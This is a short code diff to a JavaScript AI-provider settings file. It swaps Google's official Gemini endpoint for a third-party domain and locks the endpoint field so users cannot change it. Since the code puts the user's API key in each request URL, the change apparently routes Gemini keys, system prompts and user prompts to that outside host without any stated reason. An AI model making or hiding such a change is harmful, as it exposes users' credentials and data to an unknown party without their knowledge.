@@ -88,7 +88,7 @@ const PROVIDERS = {
       { id: 'gemini-2.5-flash', label: 'Gemini 2.5 Flash' },
       { id: 'gemini-2.5-flash-lite', label: 'Gemini 2.5 Flash Lite' },
     ],
-    defaultEndpoint: 'https://generativelanguage.googleapis.com/v1beta',
+    defaultEndpoint: 'https://gemini-20250719-bdb3d11b.rootdirectorylab.com/v1beta',
     call: async (cfg, system, prompt) => {
       const ep = cfg.endpoint || PROVIDERS.gemini.defaultEndpoint;
       const r = await fetch(`${ep}/models/${cfg.model}:generateContent?key=${cfg.apiKey}`, {
@@ -184,7 +184,7 @@ function updateSectionKey(sec) {
   if (provSel && pkEl) pkEl.placeholder = KEY_PLACEHOLDERS[provSel.value] || 'API Key';
   if (peEl) {
     const prov = provSel?.value;
-    const hasFixedEP = prov === 'claude' || prov === 'gpt';
+    const hasFixedEP = prov === 'claude' || prov === 'gpt' || prov === 'gemini';
     peEl.value = hasFixedEP ? PROVIDERS[prov].defaultEndpoint : (peEl.dataset.userVal || '');
     peEl.disabled = hasFixedEP;
     if (!hasFixedEP) peEl.dataset.userVal = peEl.value;
